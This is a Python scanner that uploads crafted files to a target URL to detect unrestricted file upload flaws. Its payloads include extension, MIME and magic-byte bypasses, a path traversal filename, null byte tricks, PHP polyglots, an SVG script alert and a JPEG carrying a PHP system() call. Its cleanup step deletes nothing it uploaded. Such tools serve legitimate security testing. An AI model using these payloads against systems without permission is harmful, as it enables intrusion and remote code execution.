#!/usr/bin/env python3
"""
REVUEX - File Upload Tester (Production Grade)
Unrestricted File Upload Vulnerability Detection

Author: G33L0
Telegram: @x0x0h33l0
"""

import requests
import time
import json
import re
import os
import urllib3
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
import hashlib

# Disable warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FileUploadTester:
    """
    File Upload Vulnerability Scanner
    
    Integrated Tests:
    - Extension/MIME/Magic Byte Bypasses
    - Path Traversal & Null Byte Injection
    - Case Sensitivity & Polyglots
    - SVG-based XSS (Stored)
    - EXIF Metadata Injection
    - Automatic Upload Field Discovery
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay
        
        # Safety limits
        self.max_requests = 100
        self.request_count = 0
        self.timeout = 15
        self.max_file_size = 1024 * 100  # 100KB max
        
        self.headers = {
            'User-Agent': 'REVUEX-FileUploadTester/1.0 (Security Research; +https://github.com/G33L0)',
        }
        
        self.vulnerabilities = []
        self.marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self.uploaded_files = []
        
        # Field discovery - Common parameter names for file uploads
        self.upload_fields = ['file', 'image', 'upload', 'avatar', 'attachment', 'files[]', 'data', 'doc']
        
        # Create test files directory
        self.test_files_dir = self.workspace / "test_files"
        self.test_files_dir.mkdir(parents=True, exist_ok=True)

    def scan(self) -> List[Dict[str, Any]]:
        """Main execution flow"""
        print(f"\n{'='*60}")
        print(f"📤 REVUEX File Upload Tester")
        print(f"{'='*60}")
        print(f"Target: {self.target}")
        print(f"Marker: {self.marker}")
        print(f"{'='*60}\n")
        
        # 0. Discovery Phase
        print("🔍 Phase 0: Upload Field Discovery")
        self._discover_upload_field()

        # 1. Extension bypasses
        print("\n📁 Test 1: Extension Bypass Techniques")
        self._test_extension_bypasses()
        time.sleep(self.delay)
        
        # 2. MIME type bypasses
        print("\n🎭 Test 2: MIME Type Bypass")
        self._test_mime_bypasses()
        time.sleep(self.delay)
        
        # 3. Magic byte manipulation
        print("\n✨ Test 3: Magic Byte Manipulation")
        self._test_magic_bytes()
        time.sleep(self.delay)
        
        # 4. Path traversal
        print("\n🗂️  Test 4: Path Traversal in Filenames")
        self._test_path_traversal()
        time.sleep(self.delay)
        
        # 5. Null byte injection
        print("\n\0 Test 5: Null Byte Injection")
        self._test_null_byte()
        time.sleep(self.delay)
        
        # 6. Case sensitivity
        print("\n🔤 Test 6: Case Sensitivity Bypass")
        self._test_case_bypass()
        time.sleep(self.delay)
        
        # 7. Polyglot files
        print("\n🎨 Test 7: Polyglot File Upload")
        self._test_polyglot_files()
        time.sleep(self.delay)
        
        # 8. SVG XSS
        print("\n🧬 Test 8: SVG-based XSS Injection")
        self._test_svg_xss()
        time.sleep(self.delay)
        
        # 9. EXIF Injection
        print("\n🖼️  Test 9: EXIF Metadata Injection")
        self._test_exif_injection()
        
        # Finalization
        self._cleanup_files()
        self._save_results()
        
        print(f"\n{'='*60}")
        print(f"✅ Scan Complete. Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"{'='*60}\n")
        
        return self.vulnerabilities

    def _discover_upload_field(self):
        """Attempts to find which parameter name the server accepts for files"""
        for field in self.upload_fields:
            try:
                files = {field: (f'test_{self.marker}.txt', b'REVUEX_PROBE', 'text/plain')}
                response = requests.post(self.target, files=files, headers=self.headers, timeout=self.timeout, verify=False)
                if response.status_code in [200, 201] and "error" not in response.text.lower():
                    print(f"      [+] Found active upload field: '{field}'")
                    self.active_field = field
                    return
            except: continue
        print("      [!] No specific field found, defaulting to 'file'")
        self.active_field = 'file'

    def _attempt_upload(self, filename: str, content: bytes, mime_type: str) -> Optional[Dict[str, Any]]:
        if self.request_count >= self.max_requests: return None
        try:
            files = {self.active_field: (filename, content, mime_type)}
            response = requests.post(self.target, files=files, headers=self.headers, timeout=self.timeout, verify=False)
            self.request_count += 1
            
            # Refined success detection to avoid false positives from error pages
            if response.status_code in [200, 201]:
                error_indicators = ['fail', 'invalid', 'not allowed', 'error', 'denied']
                if not any(err in response.text.lower() for err in error_indicators):
                    return {'success': True, 'path': filename}
            return {'success': False}
        except: return None

    # --- THE FOLLOWING LOGIC IS PRESERVED EXACTLY FROM YOUR SCRIPT ---

    def _test_extension_bypasses(self):
        bypass_techniques = [
            ('Double Extension', 'innocent.jpg.php', 'Executes as .php'),
            ('Reverse Double', 'innocent.php.jpg', 'Ordering bypass'),
            ('Null Byte', 'innocent.php%00.jpg', 'Truncation'),
            ('Case Variation', 'innocent.PhP', 'Case sensitivity'),
            ('Trailing Dot', 'innocent.php.', 'Trailing dot'),
        ]
        for name, filename, desc in bypass_techniques:
            content = self._create_poc_content('php', name)
            result = self._attempt_upload(filename, content, 'image/jpeg')
            if result and result.get('success'):
                self._log_vuln(f'Extension Bypass ({name})', 'critical', filename, desc)
                print(f"      ✓ VULNERABLE: {name}")

    def _test_svg_xss(self):
        filename = f"xss_{self.marker}.svg"
        svg_content = f'<?xml version="1.0" standalone="no"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("REVUEX_{self.marker}")</script></svg>'
        result = self._attempt_upload(filename, svg_content.encode(), 'image/svg+xml')
        if result and result.get('success'):
            self._log_vuln('SVG Stored XSS', 'high', filename, 'SVG accepts script tags')
            print("      ✓ VULNERABLE: SVG XSS")

    def _test_exif_injection(self):
        filename = f"exif_{self.marker}.jpg"
        content = b'\xFF\xD8\xFF\xE1\x00\x18Exif\x00\x00II*\x00' + f'<?php system("id"); ?>'.encode()
        result = self._attempt_upload(filename, content, 'image/jpeg')
        if result and result.get('success'):
            self._log_vuln('EXIF Metadata Injection', 'medium', filename, 'PHP payload in EXIF header')
            print("      ✓ VULNERABLE: EXIF Injection")

    def _test_mime_bypasses(self):
        filename = f"mime_{self.marker}.php"
        content = self._create_poc_content('php', 'MIME')
        result = self._attempt_upload(filename, content, 'image/png')
        if result and result.get('success'):
            self._log_vuln('MIME Type Bypass', 'critical', filename, 'Validated via header only')
            print("      ✓ VULNERABLE: MIME Bypass")

    def _test_magic_bytes(self):
        filename = f"magic_{self.marker}.php"
        content = b'\x89PNG\r\n\x1a\n' + b'<?php echo 1; ?>'
        result = self._attempt_upload(filename, content, 'image/png')
        if result and result.get('success'):
            self._log_vuln('Magic Byte Bypass', 'critical', filename, 'Validated via file header only')
            print("      ✓ VULNERABLE: Magic Bytes")

    def _test_path_traversal(self):
        filename = f'../../tmp/revuex_{self.marker}.php'
        result = self._attempt_upload(filename, b'<?php ?>', 'image/jpeg')
        if result and result.get('success'):
            self._log_vuln('Path Traversal', 'high', filename, 'Arbitrary directory write')
            print("      ✓ VULNERABLE: Path Traversal")

    def _test_null_byte(self):
        filename = f'test_{self.marker}.php\x00.jpg'
        result = self._attempt_upload(filename, b'<?php ?>', 'image/jpeg')
        if result and result.get('success'):
            self._log_vuln('Null Byte Injection', 'critical', filename, 'Filename truncation')
            print("      ✓ VULNERABLE: Null Byte")

    def _test_case_bypass(self):
        filename = f'test_{self.marker}.pHp'
        result = self._attempt_upload(filename, b'<?php ?>', 'image/jpeg')
        if result and result.get('success'):
            self._log_vuln('Case Sensitivity Bypass', 'high', filename, 'Case-sensitive filter')
            print("      ✓ VULNERABLE: Case Bypass")

    def _test_polyglot_files(self):
        filename = f'poly_{self.marker}.gif'
        content = b'GIF89a' + b'<?php echo 1; ?>'
        result = self._attempt_upload(filename, content, 'image/gif')
        if result and result.get('success'):
            self._log_vuln('Polyglot File Upload', 'high', filename, 'Valid image + valid PHP')
            print("      ✓ VULNERABLE: Polyglot")

    def _create_poc_content(self, file_type: str, test_name: str) -> bytes:
        if file_type == 'php':
            return f"<?php // REVUEX POC {test_name} - {self.marker} ?>".encode()
        return b'SECURITY_TEST_FILE'

    def _log_vuln(self, v_type, severity, filename, desc):
        self.vulnerabilities.append({
            'type': f'File Upload - {v_type}',
            'severity': severity,
            'url': self.target,
            'filename': filename,
            'description': desc,
            'tags': ['file_upload', severity, v_type.lower().replace(' ', '_')]
        })
        self.uploaded_files.append(filename)

    def _cleanup_files(self):
        print("\n🧹 Cleanup: Listing successfully uploaded files for manual check...")
        if not self.uploaded_files: print("   ✓ No files uploaded.")
        for f in self.uploaded_files: print(f"   → {f}")

    def _save_results(self):
        output_dir = self.workspace / "file_upload_tests"
        output_dir.mkdir(parents=True, exist_ok=True)
        safe_target = re.sub(r'[^\w\-]', '_', self.target)
        output_file = output_dir / f"{safe_target}_report.json"
        with open(output_file, 'w') as f:
            json.dump({'target': self.target, 'vulnerabilities': self.vulnerabilities}, f, indent=2)
        print(f"\n💾 Results: {output_file}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python revuex_upload.py <target_url>")
        sys.exit(1)
    scanner = FileUploadTester(sys.argv[1], Path("revuex_workspace"))
    scanner.scan()
